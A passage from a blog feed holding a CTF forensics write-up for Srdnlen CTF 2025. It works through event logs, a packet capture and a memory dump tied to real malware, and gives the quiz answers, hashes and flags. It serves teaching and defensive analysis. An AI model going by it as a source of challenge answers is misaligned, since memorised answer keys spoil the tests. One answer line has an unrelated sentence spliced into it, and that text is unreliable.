&lt;p&gt;I participated in BYUCTF 2025, organized by BYU Cyberia, as a member of my institute’s club, InfoSecIITR. This writeu</summary>
      
    
    
    
    <category term="CTF-Writeups" scheme="https://g4rud4kun.github.io/categories/CTF-Writeups/"/>
    
    
    <category term="forensics" scheme="https://g4rud4kun.github.io/tags/forensics/"/>
    
    <category term="VM" scheme="https://g4rud4kun.github.io/tags/VM/"/>
    
    <category term="Winevt" scheme="https://g4rud4kun.github.io/tags/Winevt/"/>
    
  </entry>
  
  <entry>
    <title>Srdnlen CTF 2025</title>
    <link href="https://g4rud4kun.github.io/2025/01/21/Srdnlen-CTF-2025/"/>
    <id>https://g4rud4kun.github.io/2025/01/21/Srdnlen-CTF-2025/</id>
    <published>2025-01-21T09:41:15.000Z</published>
    <updated>2025-02-05T18:34:48.324Z</updated>
    
    <content type="html"><![CDATA[<p>I participated in Srdnlen CTF 2025, as a member of my institute’s club, InfoSecIITR. This writeup details the challenges of the forensics category.</p><h2 id="Misc-Forensics"><a href="#Misc-Forensics" class="headerlink" title="Misc-Forensics"></a>Misc-Forensics</h2><h3 id="DFIR-1-Malvent"><a href="#DFIR-1-Malvent" class="headerlink" title="DFIR 1 - Malvent"></a>DFIR 1 - Malvent</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We have been notified of an attack in one of our machines. This is a real forensics investigation and you have to analyse the given evtx files and answer to the related questions. At the end you will get the flag when you answer everything correct.</p><p>Dfir 1 - Question 4: you have to find all the numbers separated by a comma related to insecure credential management (e.g., 1000, 2355, etc)</p><p>NOTE: This is a real malware. Do not execute nothing. Pay attention and be careful. Srdnlen denies every damage on your infrastructure.</p><p>This is a remote challenge, you can connect to the service with: <code>nc dfir1.challs.srdnlen.it 1984</code></p><p>Author: slsanna<br>Attachments: al_evtx.zip</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>We received a series of DFIR Challenges from 1-4 and were provided with the al_evtx.zip file for the first challenge. To analyze these files, I used the Event Viewer tool.</p><p>Step 1: Initial Connection and Question 1</p><p>Let’s start by running the nc instance:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc dfir1.challs.srdnlen.it 1984</span><br><span class="line"></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"><span class="comment">#    Welcome to DFIR.1 Malvent Challenge!    #</span></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"></span><br><span class="line">In this challenge, you have to retrieve information from the given evtx files from al_evtx.zip</span><br><span class="line">You will answer a series of questions.</span><br><span class="line">Each correct answer will take you closer to the flag srdnlen&#123;something&#125;</span><br><span class="line">Good luck!</span><br><span class="line"></span><br><span class="line">What is the name of the suspicious service installed?</span><br></pre></td></tr></table></figure><p>For this question, I started analyzing System logs. While checking the logs of the Source Service Control Manager, I noticed that a service with a random name had started, and the source of it was also a random filename, which seemed suspicious. This is shown below in the image:</p><p><img src="/images/posts/2025-srdnlenctf/sus_service.png" alt="Sus"></p><p>I submitted the name and found that it was the correct one.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the name of the suspicious service installed?</span><br><span class="line">QcUcMElh</span><br><span class="line">Correct!</span><br><span class="line">From which process it has been generated? Give also the extension</span><br></pre></td></tr></table></figure><p>Using the same image above, I could answer the questions in Step 2 &amp; 3.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">From which process it has been generated? Give also the extension</span><br><span class="line">lmIcgUEQ.exe</span><br><span class="line">Correct!</span><br><span class="line">What is its event ID?</span><br><span class="line">7045</span><br><span class="line">Correct!</span><br><span class="line">Give the events IDs corresponding to unsecured data (e.g. cryptography). If more than one put a comma (e.g. 1, 2)</span><br></pre></td></tr></table></figure><p>Step 4: Finding Event IDs for Unsecured Data</p><p>I think this question was unclear, and the hint released later on, mentioned in the description, made it even more confusing. Because of this, we were unable to solve it, and many others were just analyzing the Security logs like us. Some of them brute-forced and found the correct one. :(</p><p>I got the answer to this question later from <code>warlocksmurf</code>. When analyzing the System logs, I came across the TPM Logs, which showed that the data could not be encrypted.</p><p><img src="/images/posts/2025-srdnlenctf/unsecured_data.png" alt="TPM"></p><p>One of the event IDs is 15, and while finding the second event ID, I realized that event ID 18 contains the message: “This event triggers the Trusted Platform Module (TPM) provisioning&#x2F;status check to run.” With this, we get both event IDs.</p><p>After this question, the rest were doable, and we could have completed this challenge during the competition.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Give the events IDs corresponding to unsecured data (e.g. cryptography). If more than one put a comma (e.g. 1, 2)</span><br><span class="line">15, 18</span><br><span class="line">Correct!</span><br><span class="line">Which event ID is related to the state of the account protection?</span><br></pre></td></tr></table></figure><p>Step 5: Identifying the Event ID Related to Account Protection</p><p>While analyzing the System logs, I came across Event ID 16977 from the Source Directory-Services-SAM, which referenced the password.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Which event ID is related to the state of the account protection?</span><br><span class="line">16977</span><br><span class="line">Correct!</span><br><span class="line">Give the compromised CLSID stating that malicious code could be executed. If more than one, put a comma (e.g. str1, str2)</span><br></pre></td></tr></table></figure><p>Step 6: Finding Compromised CLSIDs</p><p>For this question, search for “CLSID” in the System logs using Find. You will find two strings, as shown below:</p><p><img src="/images/posts/2025-srdnlenctf/clsid.png" alt="CLSID"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Give the compromised CLSID stating that malicious code could be executed. If more than one, put a comma (e.g. str1, str2)</span><br><span class="line">Windows.SecurityCenter.SecurityAppBroker, Windows.SecurityCenter.WscBrokerManager</span><br><span class="line">Correct!</span><br><span class="line">What is the port number listening for remote control?</span><br></pre></td></tr></table></figure><p>Step 7: Determining the Port Number for Remote Control</p><p>For this question, I found RDP URLs in the System logs. I tried all the associated port numbers, and the correct one is shown below:</p><p><img src="/images/posts/2025-srdnlenctf/rdp.png" alt="Remote"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the port number listening for remote control?</span><br><span class="line">3387</span><br><span class="line">Correct!</span><br><span class="line">Give the event ID related to the manipulation of specific data (e.g. registry key manipulation, deletion, creation, modification)</span><br></pre></td></tr></table></figure><p>Step 8: Locating the Event ID for the Manipulation</p><p>While analyzing the System logs, I found that Event ID 16 was associated with changes in Hives, which was the correct answer.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Give the event ID related to the manipulation of specific data (e.g. registry key manipulation, deletion, creation, modification)</span><br><span class="line">16</span><br><span class="line">Correct!</span><br><span class="line">Give the application name whose corruption could depend from the malware. (First letter uppercase, add also the extension).</span><br></pre></td></tr></table></figure><p>Step 9: Finding the Malware-Affected Application</p><p>While analyzing the Application logs, I found an event with suspicious messages including Widgets.exe, which matched the question. This turned out to be the correct one.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Give the application name whose corruption could depend from the malware. (First letter uppercase, add also the extension).</span><br><span class="line">Widgets.exe</span><br><span class="line">Correct!</span><br><span class="line">Is Windows Defender on?</span><br></pre></td></tr></table></figure><p>Step 10: Checking Windows Defender Status</p><p>For this question, I found the result as shown below:</p><p><img src="/images/posts/2025-srdnlenctf/windef.png" alt="WinDef"></p><p>Windows Defender was on.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Is Windows Defender on?</span><br><span class="line">Yes</span><br><span class="line">Correct!</span><br><span class="line">What is the event ID stating this?</span><br></pre></td></tr></table></figure><p>Step 11: Identifying the Event ID Indicating Windows Defender Status</p><p>From the same image, you can see that the Event ID was 15.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the event ID stating this?</span><br><span class="line">15</span><br><span class="line">Correct!</span><br><span class="line">Give the event ID related to the wrong management of different sessions and users in remote desktop</span><br></pre></td></tr></table></figure><p>Step 12: Finding Event ID for Remote Desktop Mismanagement</p><p>You can find the answer in the Application logs. The message states:<br>“The winlogon notification subscriber <SessionEnv> was unavailable to handle a critical notification event.”<br>The event ID is 6003.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Give the event ID related to the wrong management of different sessions and users in remote desktop</span><br><span class="line">6003</span><br><span class="line">Correct!</span><br><span class="line">Which event ID states that the malware could have read the credentials?</span><br></pre></td></tr></table></figure><p>Step 13: Locating the Event ID for Credential Access</p><p>I had memorized this Event ID earlier while analyzing the Security logs so much.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Which event ID states that the malware could have read the credentials?</span><br><span class="line">5379</span><br><span class="line">Correct!</span><br><span class="line">Congratulations! You have completed the quiz.</span><br><span class="line">Here&#x27;s your flag for Malvent: srdnlen&#123;DFIR1:evtx4system_mngmnt&amp;malwan&#125;</span><br></pre></td></tr></table></figure><p>We got our flag!!</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">srdnlen&#123;DFIR1:evtx4system_mngmnt&amp;malwan&#125;</span></span><br></pre></td></tr></table></figure><h3 id="DFIR-2-Malnet"><a href="#DFIR-2-Malnet" class="headerlink" title="DFIR 2 - Malnet"></a>DFIR 2 - Malnet</h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We have been notified of an attack in one of our machines. This is a real forensics investigation and you have to analyse the given pcap file and answer to the related questions. At the end you will get the flag when you answer everything correct.</p><p>NOTE: This is a real malware. Do not execute nothing. Pay attention and be careful. Srdnlen denies every damage on your infrastructure.</p><p>This is a remote challenge, you can connect to the service with: <code>nc dfir2.challs.srdnlen.it 1985</code><br>Author: slsanna</p><p>Attachments: capture_net.pcapng</p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>I’d blooded this challenge :P. We were provided with a PCAPNG file and an nc interface to answer a series of questions. Let’s begin!</p><p>Step 1: Initial Connection and Question 1</p><p>I started by connecting to the challenge service to check the first question:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nc dfir2.challs.srdnlen.it 1985</span><br><span class="line"></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"><span class="comment">#    Welcome to DFIR.2 MalNet Challenge!     #</span></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"></span><br><span class="line">In this challenge, you have to retrieve information from the given pcap capture_net.pcap </span><br><span class="line">You will answer a series of questions.</span><br><span class="line">Each correct answer will take you closer to the flag srdnlen&#123;something&#125;</span><br><span class="line">Good luck!</span><br><span class="line"></span><br><span class="line">Which packet contains the header of an executable file?</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Using Wireshark, I exported all objects (File -&gt; Export Objects) and identified the relevant files:</p><p><img src="/images/posts/2025-srdnlenctf/exp_obj.png" alt="Export Objects"></p><p>Here’s a snippet of the file types identified using the file command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ file *</span><br><span class="line">7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&amp;P2=404&amp;P3=2&amp;P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(19):  data</span><br><span class="line">7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&amp;P2=404&amp;P3=2&amp;P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(2):   PE32+ executable (GUI) x86-64, <span class="keyword">for</span> MS Windows, 7 sections</span><br><span class="line">7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&amp;P2=404&amp;P3=2&amp;P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(20):  data</span><br><span class="line">7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&amp;P2=404&amp;P3=2&amp;P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(25):  DOS executable (COM or COMBOOT 16-bit), maybe with interrupt 22h, start instruction 0xe9c6a696 d565249c</span><br><span class="line">7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&amp;P2=404&amp;P3=2&amp;P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(21):  data</span><br></pre></td></tr></table></figure><p>The file marked with (2) was identified as PE32+. Initially, I checked the packet number of this file in the Export Objects list, but it did not match. To locate the desired packet, I applied a filter as shown below and found the correct packet, which was near the packet number listed in Export Objects.</p><p><img src="/images/posts/2025-srdnlenctf/executable.png" alt="Filter"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Which packet contains the header of an executable file?</span><br><span class="line">2137</span><br><span class="line">Correct!</span><br><span class="line">To which flow does it correspond? (PROTOCOLO FLOW_ID, e.g. HTTP 1)</span><br></pre></td></tr></table></figure><p>Step 2: Determining Flow ID<br>To identify the Flow ID, I followed the TCP stream of Packet 2137 and determined the corresponding Flow ID: TCP 40.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">To which flow does it correspond? (PROTOCOLO FLOW_ID, e.g. HTTP 1)</span><br><span class="line">TCP 40</span><br><span class="line">Correct!</span><br><span class="line">Into how many parts is the executable fragmented? Give the total number of files</span><br></pre></td></tr></table></figure><p>Step 3: Fragmentation<br>After saving the files locally, I found that the executable was fragmented into 29 parts (from 0 to 28).</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Into how many parts is the executable fragmented? Give the total number of files</span><br><span class="line">29</span><br><span class="line">Correct!</span><br><span class="line">What is the resource name accessed in the GET resource containing the executable file?. Give the complete name (e.g. /myfile/file1/this-is-the-file?A0=something&amp;A1=other%3d%3d)</span><br></pre></td></tr></table></figure><p>Step 4: Resource Name<br>Searching for the resource name in the packets revealed the following:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the resource name accessed in the GET resource containing the executable file?. Give the complete name (e.g. /myfile/file1/this-is-the-file?A0=something&amp;A1=other%3d%3d)</span><br><span class="line">/filestreamingservice/files/7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509?P1=1736543287&amp;P2=404&amp;P3=2&amp;P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d</span><br><span class="line">Correct!</span><br><span class="line">What is the sha256 of the first part of the executable file?</span><br></pre></td></tr></table></figure><p>Step 5: SHA256 Check<br>The SHA256 hash of the first part of the executable file (file (2)) was calculated as follows:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sha256sum</span> 7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1/=1736543287/&amp;P2/=404/&amp;P3/=2/&amp;P4/=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d/(2/) </span><br><span class="line">b56b0ee4af8f4395455ed4f83b2d25498444c939fcf77d49ec9ec83c68983e52  7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&amp;P2=404&amp;P3=2&amp;P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(2)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the sha256 of the first part of the executable file?</span><br><span class="line">b56b0ee4af8f4395455ed4f83b2d25498444c939fcf77d49ec9ec83c68983e52</span><br><span class="line">Correct!</span><br><span class="line">To which of the extracted files does it correspond? As done by Wireshark, use the enumeration starting from 0</span><br></pre></td></tr></table></figure><p>Step 6 - Corresponding Extracted File Enumeration<br>Using the Wireshark export naming convention, the file corresponds to the index (2).</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">To which of the extracted files does it correspond? As done by Wireshark, use the enumeration starting from 0</span><br><span class="line">2</span><br><span class="line">Correct!</span><br><span class="line">What is the sha256sum of the reconstructed file?</span><br></pre></td></tr></table></figure><p>Step 7 - SHA-256 of the Reconstructed File</p><p>This was the trickiest question. As usual, I first attempted to reconstruct the 7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509 file using the pieces numbered (0) to (28). However, the reconstructed file did not match the full size specified in the packet, which was 176,870,976 bytes. This prompted me to explore other sources for the hash. It occurred to me that we had also received a piecehash file, which might be useful.</p><p>The content of the piecehash file was as follows:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;MajorVersion&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;MinorVersion&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;HashOfHashes&quot;</span><span class="punctuation">:</span><span class="string">&quot;JvZyinMn7LiBqNeYmy7JPeu8Kn4chEzksqZUnwB2Pg4=&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ContentLength&quot;</span><span class="punctuation">:</span><span class="number">176870976</span><span class="punctuation">,</span><span class="attr">&quot;PieceSize&quot;</span><span class="punctuation">:</span><span class="number">1048576</span><span class="punctuation">,</span><span class="attr">&quot;Pieces&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;tWsO5K+PQ5VFXtT4Oy0lSYREyTn8931J7J7IPGiYPlI=&quot;</span><span class="punctuation">,</span><span class="string">&quot;VXw6j5l8k7XNgyfLxfWGKbogZJOn/H9QjwKf8rKKgu0=&quot;</span><span class="punctuation">,</span><span class="string">&quot;q2tg5LDXyy0r0B1aSW+cSfV73UedLIbMTQZ+V+UvlCs=&quot;</span><span class="punctuation">,</span><span class="string">&quot;....</span></span><br></pre></td></tr></table></figure><p>This file contained the HashOfHashes as well as 167 piece hashes. Since we already knew the size of the main file, which was also mentioned in this file, I hypothesized that the HashOfHashes could be the hash of the main file. I decoded the HashOfHashes and converted it to hexadecimal. Upon verification, it turned out to be the desired hash.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the sha256sum of the reconstJust follow the packet and you will get the answer for the above question and also for after one.ructed file?</span><br><span class="line">26F6728A7327ECB881A8D7989B2EC93DEBBC2A7E1C844CE4B2A6549F00763E0E</span><br><span class="line">Correct!</span><br><span class="line">How many downloaded chrome extensions are not corrupted?</span><br></pre></td></tr></table></figure><p>Step 8 - Number of Non-Corrupted Chrome Extensions<br>Among the exported objects, six were Chrome extensions. Using the file command, I identified that one file did not display as a <code>Google Chrome extension, version 3</code>, indicating it was corrupted. Thus, five extensions were not corrupted.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">How many downloaded chrome extensions are not corrupted?</span><br><span class="line">5</span><br><span class="line">Correct!</span><br><span class="line">Which packet is related to cryptomining?</span><br></pre></td></tr></table></figure><p>Step 9 - Packet Related to Cryptomining<br>I applied the filter <code>frame contains &quot;cryptomin&quot;</code> in Wireshark and identified the relevant packet as:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Which packet is related to cryptomining?</span><br><span class="line">290</span><br><span class="line">Correct!</span><br><span class="line">To which flow does it correspond? (PROTOCOLO FLOW_ID, e.g. UDP 0)</span><br></pre></td></tr></table></figure><p>Step 10 - Corresponding Flow for Cryptomining Packet<br>Following the TCP stream of packet 290 revealed the flow ID:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">To which flow does it correspond? (PROTOCOLO FLOW_ID, e.g. UDP 0)</span><br><span class="line">http 8</span><br><span class="line">Correct!</span><br><span class="line">What is the resource name? Give the complete name (e.g. /myfile/file1/this-is-the-file?A0=something&amp;A1=other%3d%3d)</span><br></pre></td></tr></table></figure><p>Step 11 - Resource Name for Cryptomining<br>The resource name associated with the packet was:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the resource name? Give the complete name (e.g. /myfile/file1/this-is-the-file?A0=something&amp;A1=other%3d%3d)</span><br><span class="line">/filestreamingservice/files/dfeb2940-49d3-4f29-8fd8-d984a787dc6e?P1=1736222766&amp;P2=404&amp;P3=2&amp;P4=H1jtSvldNZpuTpd5fP9uKkWsRR%2f5pXzccLVud6a0mJoxofqoKB34dNqF4qXGEwhkbPhjKQoon413psf1XzNktA%3d%3d</span><br><span class="line">Correct!</span><br><span class="line">Give the sha256 of the file related to cryptocurrency.</span><br></pre></td></tr></table></figure><p>Step 12 - SHA-256 of the Cryptomining File<br>To verify the cryptomining file, I exported it using Wireshark’s “Export Objects” feature and calculated its SHA-256 hash using the sha256sum command:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Give the sha256 of the file related to cryptocurrency.</span><br><span class="line">364dfe0f3c1ad2df13e7629e2a7188fae3881ddb83a46c1170112d8d3b5a73de</span><br><span class="line">Correct!</span><br><span class="line">Congratulations! You have completed the quiz.</span><br><span class="line">Here&#x27;s your flag for challenge Malnet: srdnlen&#123;DFIR2:network_analysis_R34L_malware&#125;</span><br></pre></td></tr></table></figure><p>Completed the challenge!</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">srdnlen&#123;DFIR2:network_analysis_R34L_malware&#125;</span></span><br></pre></td></tr></table></figure><h3 id="DFIR-3-RAMsomwhere"><a href="#DFIR-3-RAMsomwhere" class="headerlink" title="DFIR 3 - RAMsomwhere"></a>DFIR 3 - RAMsomwhere</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We have been notified of an attack in one of our machines. This is a real forensics investigation and you have to analyse the given elf file and answer to the related questions. At the end you will get the flag when you answer everything correct.</p><p>For questions related to finding something network related “not present in the pcap” - we are referring to the pcap of DFIR2 - MalNet.</p><p>You can download the file from this link: <a href="https://tinyurl.com/srdnlenCTF24-dfir3">https://tinyurl.com/srdnlenCTF24-dfir3</a></p><p>NOTE: This is a real malware. Do not execute nothing. Pay attention and be careful. Srdnlen denies every damage on your infrastructure.</p><p>This is a remote challenge, you can connect to the service with: <code>nc dfir3.challs.srdnlen.it 1986</code><br>Author: slsanna</p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>I received a memory capture ELF file and an nc instance. Let’s start:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc dfir3.challs.srdnlen.it 1986</span><br><span class="line"></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"><span class="comment">#  Welcome to DFIR.3 RAMsomewhere Challenge!  #</span></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"></span><br><span class="line">In this challenge, you have to retrieve information from the given memory dump. </span><br><span class="line">You will answer a series of questions.</span><br><span class="line">Each correct answer will take you closer to the flag srdnlen&#123;something&#125;</span><br><span class="line">Good luck!</span><br><span class="line"></span><br><span class="line">What is the PID of the process found <span class="keyword">in</span> the evtx analysis?</span><br></pre></td></tr></table></figure><p>Step 1: Finding the PID from EVTX Analysis</p><p>To analyze the memory file, I used Volatility3 to identify the PID of the process found in the EVTX analysis. The process in question was lmIcgUEQ.exe. The following steps were performed:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">$ python3 vol.py -f ~/Downloads/capture_ram.elf windows.pslist</span><br><span class="line">Volatility 3 Framework 